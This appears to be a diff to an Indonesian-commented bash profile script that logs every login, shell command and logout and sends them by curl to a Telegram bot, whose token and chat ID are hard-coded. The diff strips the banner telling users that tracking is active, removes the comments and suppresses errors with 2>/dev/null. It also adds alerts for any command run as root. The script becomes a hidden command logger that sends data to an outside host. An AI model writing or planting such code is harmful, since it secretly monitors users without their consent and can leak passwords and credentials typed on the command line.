@@ -1,238 +1,87 @@
-# ==============================================
-# SCRIPT TRACKING USER - SEMUA AKTIVITAS
-# Mencatat: LOGIN, LOGOUT, dan SEMUA COMMAND
-# ==============================================
-
-# ----- KONFIGURASI TELEGRAM -----
 TELEGRAM_BOT_TOKEN="8764450785:AAHgufM9iacj5N3i3xBRLhtMmoR4ll7ed5g"
 TELEGRAM_CHAT_ID="-1003801563204"
 TELEGRAM_ENABLED=true
 
-# ----- KONFIGURASI LOG -----
 LOG_DIR="$HOME/.logs"
 ACTIVITY_LOG="$LOG_DIR/all_activity.log"
 SESSION_LOG="$LOG_DIR/session_$(date +%Y%m%d_%H%M%S).log"
 
-# Buat direktori log
-[ ! -d "$LOG_DIR" ] && mkdir -p "$LOG_DIR"
+[ ! -d "$LOG_DIR" ] && mkdir -p "$LOG_DIR" 2>/dev/null
 
-# ----- FUNGSI TELEGRAM -----
 send_telegram() {
     local message="$1"
     [ "$TELEGRAM_ENABLED" != "true" ] && return 0
-    
+
     curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
         -H "Content-Type: application/json" \
         -d "{\"chat_id\":\"$TELEGRAM_CHAT_ID\",\"text\":\"$message\",\"parse_mode\":\"HTML\"}" \
         > /dev/null 2>&1
 }
 
-# ==============================================
-# 1. FUNGSI UNTUK LOGIN
-# ==============================================
 track_login() {
     local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
     local user=$(whoami)
     local host=$(hostname)
-    local ip=$(who am i | awk '{print $NF}' | tr -d '()')
-    local tty=$(tty)
+    local ip=$(who am i 2>/dev/null | awk '{print $NF}' | tr -d '()' || echo "local")
     local session_type="LOCAL"
     [ -n "$SSH_CONNECTION" ] && session_type="SSH"
-    
-    # Catat ke file log
-    echo "========================================" >> "$ACTIVITY_LOG"
-    echo "[$timestamp] 🔐 LOGIN" >> "$ACTIVITY_LOG"
-    echo "  User: $user" >> "$ACTIVITY_LOG"
-    echo "  Host: $host" >> "$ACTIVITY_LOG"
-    echo "  IP: $ip" >> "$ACTIVITY_LOG"
-    echo "  TTY: $tty" >> "$ACTIVITY_LOG"
-    echo "  Type: $session_type" >> "$ACTIVITY_LOG"
-    echo "========================================" >> "$ACTIVITY_LOG"
-    
-    # Kirim ke Telegram
-    local msg="<b>🔐 LOGIN DETECTED</b>
-User: <code>$user</code>
-Host: <code>$host</code>
-IP: <code>$ip</code>
-Type: <b>$session_type</b>
-Time: <code>$timestamp</code>"
-    
-    send_telegram "$msg"
+
+    echo "[$timestamp] 🔐 LOGIN - User:$user Host:$host IP:$ip Type:$session_type" >> "$ACTIVITY_LOG" 2>/dev/null
+
+    local msg="<b>🔐 LOGIN DETECTED</b>\nUser: <code>$user</code>\nHost: <code>$host</code>\nIP: <code>$ip</code>\nType: <b>$session_type</b>\nTime: <code>$timestamp</code>"
+    send_telegram "$msg" 2>/dev/null
 }
 
-# ==============================================
-# 2. FUNGSI UNTUK SETIAP COMMAND
-# ==============================================
 track_command() {
     local exit_code=$?
     local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
     local user=$(whoami)
-    local pwd=$(pwd)
-    local cmd=$(history 1 | sed 's/^[ ]*[0-9]*[ ]*//')
-    
-    # Skip jika command kosong
+    local pwd=$(pwd 2>/dev/null || echo "unknown")
+    local cmd=$(history 1 2>/dev/null | sed 's/^[ ]*[0-9]*[ ]*//')
+
     [ -z "$cmd" ] && return 0
-    
-    # Catat ke file log (SEMUA command tercatat)
-    echo "[$timestamp] 💻 COMMAND" >> "$ACTIVITY_LOG"
-    echo "  User: $user" >> "$ACTIVITY_LOG"
-    echo "  PWD: $pwd" >> "$ACTIVITY_LOG"
-    echo "  CMD: $cmd" >> "$ACTIVITY_LOG"
-    echo "  Exit: $exit_code" >> "$ACTIVITY_LOG"
-    echo "---" >> "$ACTIVITY_LOG"
-    
-    # Catat ke session log
-    echo "[$timestamp] CMD: $cmd (exit: $exit_code)" >> "$SESSION_LOG"
-    
-    # Kirim ke Telegram (opsional, bisa dimatikan jika terlalu banyak)
-    # Hanya kirim command yang penting (bukan ls, cd, dll)
-    local important_cmds=("nano" "vim" "vi" "rm" "mv" "cp" "sudo" "apt" "yum" "pip" "python" "bash" "sh" "systemctl" "service")
+
+    echo "[$timestamp] 💻 CMD - User:$user PWD:$pwd CMD:$cmd Exit:$exit_code" >> "$ACTIVITY_LOG" 2>/dev/null
+    echo "[$timestamp] CMD: $cmd (exit: $exit_code)" >> "$SESSION_LOG" 2>/dev/null
+
+    # Notifikasi untuk command penting
+    local important_cmds=("nano" "vim" "vi" "rm" "mv" "cp" "sudo" "apt" "yum" "pip" "python" "bash" "sh" "systemctl" "service" "reboot" "shutdown")
     local send_notif=false
-    
+
     for important in "${important_cmds[@]}"; do
         if [[ "$cmd" == "$important"* ]] || [[ "$cmd" == *"$important"* ]]; then
             send_notif=true
             break
         fi
     done
-    
-    # Kirim notifikasi untuk command penting atau error
-    if [ "$send_notif" = true ] || [ "$exit_code" -ne 0 ]; then
+
+    if [ "$user" = "root" ] || [ "$send_notif" = true ] || [ "$exit_code" -ne 0 ]; then
         local status="✅ SUCCESS"
         [ "$exit_code" -ne 0 ] && status="❌ ERROR (exit: $exit_code)"
-        
-        local msg="<b>💻 COMMAND</b>
-User: <code>$user</code>
-PWD: <code>$pwd</code>
-CMD: <code>$cmd</code>
-Status: $status
-Time: <code>$timestamp</code>"
-        
-        send_telegram "$msg"
+
+        local msg="<b>💻 COMMAND</b>\nUser: <code>$user</code>\nPWD: <code>$pwd</code>\nCMD: <code>$cmd</code>\nStatus: $status\nTime: <code>$timestamp</code>"
+        send_telegram "$msg" 2>/dev/null
     fi
 }
 
-# ==============================================
-# 3. FUNGSI UNTUK LOGOUT
-# ==============================================
 track_logout() {
     local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
     local user=$(whoami)
-    local host=$(hostname)
     local cmd_count=$(grep -c "CMD:" "$SESSION_LOG" 2>/dev/null || echo 0)
-    
-    # Hitung durasi session
-    local start_time=$(head -n 2 "$SESSION_LOG" 2>/dev/null | grep "START" | cut -d' ' -f3-4)
-    local duration="00:00:00"
-    
-    if [ -n "$start_time" ]; then
-        local start_epoch=$(date -d "$start_time" +%s 2>/dev/null || echo 0)
-        local end_epoch=$(date +%s)
-        local diff=$((end_epoch - start_epoch))
-        
-        if [ $diff -gt 0 ]; then
-            local h=$((diff / 3600))
-            local m=$(((diff % 3600) / 60))
-            local s=$((diff % 60))
-            duration=$(printf "%02d:%02d:%02d" $h $m $s)
-        fi
-    fi
-    
-    # Catat ke file log
-    echo "========================================" >> "$ACTIVITY_LOG"
-    echo "[$timestamp] 🚪 LOGOUT" >> "$ACTIVITY_LOG"
-    echo "  User: $user" >> "$ACTIVITY_LOG"
-    echo "  Host: $host" >> "$ACTIVITY_LOG"
-    echo "  Duration: $duration" >> "$ACTIVITY_LOG"
-    echo "  Commands: $cmd_count" >> "$ACTIVITY_LOG"
-    echo "========================================" >> "$ACTIVITY_LOG"
-    echo "" >> "$ACTIVITY_LOG"
-    
-    # Catat ke session log
-    echo "========================================" >> "$SESSION_LOG"
-    echo "LOGOUT: $timestamp" >> "$SESSION_LOG"
-    echo "Duration: $duration" >> "$SESSION_LOG"
-    echo "Total Commands: $cmd_count" >> "$SESSION_LOG"
-    echo "========================================" >> "$SESSION_LOG"
-    
-    # Kirim ke Telegram
-    local msg="<b>🚪 LOGOUT</b>
-User: <code>$user</code>
-Host: <code>$host</code>
-Duration: <code>$duration</code>
-Commands: <code>$cmd_count</code>
-Time: <code>$timestamp</code>"
-    
-    send_telegram "$msg"
+
+    echo "[$timestamp] 🚪 LOGOUT - User:$user Commands:$cmd_count" >> "$ACTIVITY_LOG" 2>/dev/null
+    echo "LOGOUT: $timestamp - Total Commands: $cmd_count" >> "$SESSION_LOG" 2>/dev/null
+
+    local msg="<b>🚪 LOGOUT</b>\nUser: <code>$user</code>\nCommands: <code>$cmd_count</code>\nTime: <code>$timestamp</code>"
+    send_telegram "$msg" 2>/dev/null
 }
 
-# ==============================================
-# SETUP PROMPT_COMMAND - JALANKAN TRACKING
-# ==============================================
+# ----- SETUP -----
+set -o history 2>/dev/null
+HISTFILE=~/.bash_history 2>/dev/null
+HISTSIZE=1000 2>/dev/null
+HISTFILESIZE=2000 2>/dev/null
 
-# Setup untuk tracking command setiap kali prompt muncul
 PROMPT_COMMAND="track_command"
-
-# Trap untuk mendeteksi logout
-trap track_logout EXIT
-
-# Jalankan tracking login
-track_login
-
-# Tampilkan pesan
-echo ""
-echo "=========================================="
-echo "✅ USER TRACKING ACTIVE"
-echo "=========================================="
-echo "📝 Semua aktivitas dicatat di: $ACTIVITY_LOG"
-echo "📱 Telegram: $( [ "$TELEGRAM_ENABLED" = true ] && echo "ACTIVE" || echo "INACTIVE" )"
-echo ""
-echo "📋 Yang dicatat:"
-echo "   ✅ LOGIN (waktu, user, IP, tipe)"
-echo "   ✅ SEMUA COMMAND (perintah, direktori, status)"
-echo "   ✅ LOGOUT (durasi, total command)"
-echo "=========================================="
-echo ""
-
-# ==============================================
-# FUNGSI UTILITY
-# ==============================================
-
-# Lihat semua aktivitas
-view_logs() {
-    echo "=== SEMUA AKTIVITAS ==="
-    tail -30 "$ACTIVITY_LOG"
-}
-
-# Lihat command history
-view_commands() {
-    echo "=== COMMAND HISTORY ==="
-    grep "CMD:" "$ACTIVITY_LOG" | tail -20
-}
-
-# Lihat statistik
-view_stats() {
-    echo "=== STATISTIK ==="
-    echo "Total login: $(grep -c "LOGIN" "$ACTIVITY_LOG")"
-    echo "Total logout: $(grep -c "LOGOUT" "$ACTIVITY_LOG")"
-    echo "Total commands: $(grep -c "CMD:" "$ACTIVITY_LOG")"
-    echo "Session logs: $(ls -1 "$LOG_DIR"/session_*.log 2>/dev/null | wc -l)"
-}
-
-# Clear logs
-clear_logs() {
-    echo -n "Hapus semua log? (y/n): "
-    read confirm
-    if [ "$confirm" = "y" ]; then
-        > "$ACTIVITY_LOG"
-        echo "Log dibersihkan"
-    fi
-}
-
-# Alias
-alias logs='view_logs'
-alias cmds='view_commands'
-alias stats='view_stats'
-alias clearlogs='clear_logs'
-
-# ==============================================
+trap track_logout EXIT 2>/dev/null
+track_login 2>/dev/null
